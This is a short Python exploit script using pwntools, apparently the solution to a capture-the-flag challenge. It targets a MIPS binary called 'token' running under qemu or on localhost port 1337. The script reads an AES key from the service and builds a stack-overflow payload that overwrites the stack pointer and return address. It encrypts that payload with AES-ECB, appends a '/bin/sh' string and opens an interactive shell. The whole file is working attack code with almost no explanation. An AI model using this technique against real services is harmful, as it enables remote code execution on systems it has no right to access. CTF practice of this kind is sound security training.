from pwn import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad


#binary = "/ctf/token"
binary = "src/app/token"
elf = context.binary = ELF(binary, checksec=False)
#qemu = ELF('/ctf/qemu-mipsel',checksec=False)
qemu = ELF('src/app/qemu-mipsel',checksec=False)

if args.REMOTE:
    p = remote("localhost", 1337)
else:
    p = qemu.process(['-g','1234','/ctf/token'])


### AES HELPER FUNC ###
def encrypt_ecb(plaintext, key):
    cipher = AES.new(key, AES.MODE_ECB)
    padded_plaintext = pad(plaintext, AES.block_size)
    ciphertext = cipher.encrypt(padded_plaintext)
    return ciphertext


### GET KEY ###
key = p.recvn(16)
print("Key:",key.hex())


### SEND MESSAGE ###
payload = flat(
    b't=',              # token
    b'A'*20,            # padding
    b'0000',            # stack pointer
    p32(0x40104c)[:-1], # return address
    
    b'&t=',             # token
    b'A'*20,            # padding
    p32(0x41410f)[:-1], # stack pointer (base of input_buf + offset to /bin/sh payload - offset from gadget)
    
    b'&tz=1'            # timezone
)

HEADER = b'LExxxxxGOxxxxxx'
ciphertext = encrypt_ecb(payload, key)
total = HEADER+ciphertext+b'AAAAAAAA/bin/sh\x00'
print(total)
p.send(total)

p.interactive()